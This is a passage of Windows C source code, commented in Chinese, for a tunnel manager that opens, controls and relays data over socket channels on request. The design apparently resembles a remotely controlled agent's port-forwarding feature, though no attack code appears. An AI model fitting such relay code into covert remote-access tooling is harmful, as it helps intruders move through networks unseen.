    strcpy_s(ch->proto, sizeof(ch->proto), req.proto);
    strcpy_s(ch->target, sizeof(ch->target), req.target);
    ch->socket_handle = s;
    ch->owner = tm;
    ch->created_at = GetTickCount64();
    ch->last_seen = ch->created_at;

    /* 向管理器注册通道 */
    reason = TunnelManagerAdd(tm, ch);
    if (reason != TUNNEL_REASON_NONE) {
        RuntimeActivityEnd(ctx);
        closesocket(s);
        TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, "close", reason);
        SecureZeroMemory(ch, sizeof(*ch));
        HeapFree(GetProcessHeap(), 0, ch);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 创建工作线程 */
    ch->thread_handle = (HANDLE)_beginthreadex(NULL, 0, TunnelWorker, ch, 0, (UINT*)&thread_id);
    if (!ch->thread_handle) {
        TunnelCloseChannel(ch);
        InterlockedExchange(&ch->done, 1);
        TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, "close", TUNNEL_REASON_UNKNOWN);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 发送启动确认 */
    TunnelSendStartAck(tm, &req);
    TunnelFreeStart(&req);
    return TunnelEmptyList();
}

/* 处理隧道控制请求：暂停、恢复或关闭通道 */
PacketList TunnelHandleControl(TunnelManager* tm, Parser* parser, const CHAR* action_override)
{
    TunnelControlRequest req;
    TunnelChannel* ch;
    CHAR error[160];
    const CHAR* action;

    /* 解析并验证请求 */
    if (!TunnelParseControl(parser, &req, action_override, error, sizeof(error))) {
        return TunnelTextResult(error);
    }
    action = req.action ? req.action : "";

    /* 查找目标通道 */
    EnterCriticalSection(&tm->lock);
    ch = TunnelFindLocked(tm, req.tunnel_id, req.channel_id);
    if (!ch) {
        LeaveCriticalSection(&tm->lock);
        snprintf(error, sizeof(error), "channel %s not found", req.channel_id ? req.channel_id : "");
        TunnelFreeControl(&req);
        return TunnelTextResult(error);
    }

    /* 执行请求的操作 */
    if (strcmp(action, "pause") == 0) {
        InterlockedExchange(&ch->paused, 1);
    } else if (strcmp(action, "resume") == 0) {
        InterlockedExchange(&ch->paused, 0);
    } else if (strcmp(action, "close") == 0) {
        TunnelCloseChannel(ch);
    } else {
        LeaveCriticalSection(&tm->lock);
        snprintf(error, sizeof(error), "unknown tunnel action: %s", action);
        TunnelFreeControl(&req);
        return TunnelTextResult(error);
    }
    LeaveCriticalSection(&tm->lock);

    /* 发送控制确认 */
    TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, action, TUNNEL_REASON_NONE);
    TunnelFreeControl(&req);
    return TunnelEmptyList();
}

/* 处理隧道数据请求：将数据转发到通道套接字 */
PacketList TunnelHandleData(TunnelManager* tm, Parser* parser)
{
    TunnelDataRequest req;
    TunnelChannel* ch;
    SOCKET s;
    CHAR tunnel_id[128];
    CHAR channel_id[128];
    CHAR error[160];

    /* 解析请求 */
    if (!TunnelParseData(parser, &req, error, sizeof(error))) {
        return TunnelTextResult(error);
    }

    /* 查找通道并复制标识符 */
    EnterCriticalSection(&tm->lock);
    ch = TunnelFindLocked(tm, req.tunnel_id, req.channel_id);
    if (!ch || ch->closed) {
        LeaveCriticalSection(&tm->lock);
        TunnelFreeData(&req);
        return TunnelEmptyList();
    }
    s = ch->socket_handle;
    strcpy_s(tunnel_id, sizeof(tunnel_id), ch->tunnel_id);
    strcpy_s(channel_id, sizeof(channel_id), ch->channel_id);
    LeaveCriticalSection(&tm->lock);

    /* 将数据发送到套接字 */
    if (req.data.len > 0 && !TunnelSendAll(s, req.data.data, req.data.len)) {
        INT reason = TunnelWsaReason(WSAGetLastError());
        EnterCriticalSection(&tm->lock);
        ch = TunnelFindLocked(tm, tunnel_id, channel_id);
        if (ch) {
            TunnelCloseChannel(ch);
        }
        LeaveCriticalSection(&tm->lock);
        TunnelSendControlPacket(tm, tunnel_id, channel_id, "close", reason);
    } else if (req.data.len > 0) {
        /* 更新通道活动统计 */
        EnterCriticalSection(&tm->lock);
        ch = TunnelFindLocked(tm, tunnel_id, channel_id);
        if (ch) {
            ch->bytes_in += (UINT64)req.data.len;
            ch->last_seen = GetTickCount64();
        }
        LeaveCriticalSection(&tm->lock);
    }

    TunnelFreeData(&req);
    return TunnelEmptyList();
}
